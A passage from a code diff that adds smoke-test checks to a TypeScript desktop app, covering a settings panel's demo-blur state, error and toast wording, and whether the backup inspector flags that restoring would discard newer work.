     && /<Control/.test(appSrc) && /Dockets/.test(controlViewSrc) && controlSrc.includes('work_dockets'),
     'the durable control plane has schema, IPC, renderer binding and a visible operator surface');
@@ -6905,6 +7259,33 @@ export async function runPhaseSmoke2(check: Check, say: Say): Promise<void> {
     'the demo panel holds no second copy of the blur: the checkbox is drawn from the state the main process returned and a failed write leaves it where it was rather than showing a preference that was never stored',
     String(settingsSrc.includes('const [blur, setBlur] = useState')));
 
+  check(settingsSrc.includes('useState<DemoState | null>(null)')
+    && settingsSrc.includes('if (!state) return;')
+    && !settingsSrc.includes('{ on: false, blurTerminals: false, map: [] }'),
+    'the demo panel holds no answer until demo:state replies and writes the global data-demo-blur attribute only from an answer, so opening Settings can no longer clear the blur the always-mounted shell applied by turning a seeded {on:false, blurTerminals:false} into a claim about the stored preference',
+    String(settingsSrc.includes('useState<DemoState | null>(null)')));
+
+  check(!settingsSrc.includes('demo.state().then(setState).catch(() => {})')
+    && settingsSrc.includes('setReadErr(msg(e))')
+    && settingsSrc.includes('<PanelError what="whether demo mode is on"'),
+    'a rejected demo:state read is named on the panel with a Try again button instead of being swallowed by an empty catch, because the swallowed rejection used to leave terminals unblurred for the rest of the session while main-process masking kept inventing project names over them',
+    String(settingsSrc.includes('setReadErr(msg(e))')));
+
+  check(!settingsSrc.includes('Every tool call an agent made was allowed or asked')
+    && settingsSrc.includes("const counts = summary.v.s === 'ok' ? summary.v.d : null;"),
+    'the denied-only empty state no longer certifies every tool call an agent made from a query that returned no rows: it reads the whole-ledger summary, which policy.ledgerSummary counts unbounded by the row limit, and falls back to "Nothing recorded yet" when that summary counts nothing at all',
+    String(settingsSrc.includes('Every tool call an agent made was allowed or asked')));
+
+  check(!settingsSrc.includes('The pack itself is unchanged')
+    && settingsSrc.includes('adapter trust revoked, and the pack is disabled for new launches'),
+    'the revoke-adapter toast reports the enabled:false that revokeAdapterTrust writes beside the trust it clears, so the operator is not told the pack is unchanged by the one action that just disabled it',
+    String(settingsSrc.includes('The pack itself is unchanged')));
+
+  check(!settingsSrc.includes('Claude, Codex and GLM')
+    && settingsSrc.includes('— not even the built-in'),
+    'the empty-registry warning names no list of built-in packs, so it cannot go stale again the way it had when a fourth built-in manifest shipped and the sentence still named three',
+    String(settingsSrc.includes('Claude, Codex and GLM')));
+
   /* -- userData migration: the guard matters more than the move -------- */
   say('-- userData migration');
   const mtmp = fs.mkdtempSync(path.join(os.tmpdir(), 'wanigan-mig-'));
@@ -6945,6 +7326,64 @@ export async function runPhaseSmoke2(check: Check, say: Say): Promise<void> {
   check(fs.readFileSync(path.join(newB, 'wanigan.db'), 'utf8') === 'OLD', 'the database still lands');
 
   fs.rmSync(mtmp, { recursive: true, force: true });
+
+  // P10 · EVIDENCE_CLOCKS decides whether restoring a backup would silently
+  // roll work back. It named only session-, run- and learning-bound columns,
+  // so goal, proof, trace, control-event, checkpoint, telemetry,
+  // knowledge-candidate, scout and schedule rows were all uncovered. Given a
+  // database whose only rows newer than the backup were those, both readers
+  // took the silence as proof of safety: the Check panel said restoring would
+  // drop no recorded work, and index.ts's destructive confirmation dropped its
+  // "Everything in between will be dropped" clause on the strength of it.
+  const backupSrc = sourceOf('src/main/backup.ts');
+  const clockBlock = backupSrc.match(/const EVIDENCE_CLOCKS[\s\S]*?\n\];/)?.[0] ?? '';
+  const requiredClocks = [
+    "['work_dockets', 'updated_at']", "['work_proofs', 'created_at']",
+    "['work_trace_events', 'created_at']", "['control_events', 'created_at']",
+    "['session_checkpoints', 'at']", "['session_api_events', 'at']",
+    "['knowledge_candidates', 'updated_at']",
+    "['improvement_scout_runs', 'started_at']", "['schedule_runs', 'at']",
+  ];
+  check(clockBlock !== '' && requiredClocks.every((pair) => clockBlock.includes(pair)),
+    'EVIDENCE_CLOCKS names the Goal, proof, trace, control-event, checkpoint, telemetry, knowledge-candidate, scout and schedule columns, so days of work in any of them can no longer be rolled back by a restore that reported dropping nothing',
+    clockBlock === '' ? 'EVIDENCE_CLOCKS block not found'
+      : `missing: ${requiredClocks.filter((pair) => !clockBlock.includes(pair)).join(' ')}`);
+
+  // Forward-only is the bar for joining that list, and work_nodes fails it:
+  // retryNode sets started_at and ended_at back to NULL, so a MAX over them
+  // can move backwards — which would make a restore look safer than it is at
+  // exactly the moment a task was reopened.
+  check(!clockBlock.includes("['work_nodes'"),
+    'EVIDENCE_CLOCKS excludes work_nodes, whose started_at and ended_at are set back to NULL when a task is reopened and so can move a clock backwards',
+    clockBlock.includes("['work_nodes'") ? 'work_nodes is listed' : 'absent');
+
+  const backupHome = fs.mkdtempSync(path.join(os.tmpdir(), 'wanigan-backup-'));
+  const backupDir = path.join(backupHome, 'snapshot');
+  const taken = backup.createBackup(backupDir);
+  const quietBackup = backup.inspectBackup(backupDir);
+  check(quietBackup.problems.length === 0 && quietBackup.wouldDiscardNewer === false,
+    'a backup inspected with nothing written since it was taken verifies clean and reports no newer work to discard, so widening the clock list did not turn ordinary launch housekeeping into a false warning on every restore',
+    `problems=${quietBackup.problems.map((problem) => problem.code).join(',') || 'none'} wouldDiscardNewer=${quietBackup.wouldDiscardNewer}`);
+
+  const eventClock = (taken.latestEvidenceAt ?? Date.now()) + 1;
+  db().prepare('INSERT INTO control_events (id,project_id,source,kind,summary,status,docket_id,created_at) VALUES (?,NULL,?,?,?,?,NULL,?)')
+    .run('smoke-p10-event', 'smoke', 'note', 'Recorded after the backup was taken.', 'new', eventClock);
+  const afterEvent = backup.inspectBackup(backupDir);
+  db().prepare('DELETE FROM control_events WHERE id=?').run('smoke-p10-event');
+  check(afterEvent.wouldDiscardNewer === true && afterEvent.currentLatestEvidenceAt === eventClock,
+    'one control event recorded after a backup makes that same backup report that restoring it would discard newer work, dated to the event rather than to the last session that ended',
+    `wouldDiscardNewer=${afterEvent.wouldDiscardNewer} current=${afterEvent.currentLatestEvidenceAt} expected=${eventClock}`);
+
+  const checkpointClock = eventClock + 1;
+  db().prepare("INSERT INTO session_checkpoints (session_id,turn,kind,at,repo_root,status) VALUES ('smoke-p10',1,'turn',?,?,'ok')")
+    .run(checkpointClock, backupHome);
+  const afterCheckpoint = backup.inspectBackup(backupDir);
+  db().prepare("DELETE FROM session_checkpoints WHERE session_id='smoke-p10'").run();
+  fs.rmSync(backupHome, { recursive: true, force: true });
+  check(afterCheckpoint.wouldDiscardNewer === true && afterCheckpoint.currentLatestEvidenceAt === checkpointClock
+    && backupSrc.includes('if (inspection.wouldDiscardNewer && !opts.overwriteNewer)'),
+    'a per-turn checkpoint alone moves the clock and restoreBackup still refuses on that flag, so a restore taken mid-session is warned about and blocked even though no session started or ended in between',
+    `wouldDiscardNewer=${afterCheckpoint.wouldDiscardNewer} current=${afterCheckpoint.currentLatestEvidenceAt} expected=${checkpointClock}`);
 
   // This file started its own hook listener for the policy and MCP sections;
   // an open one keeps the event loop alive and the smoke never exits.
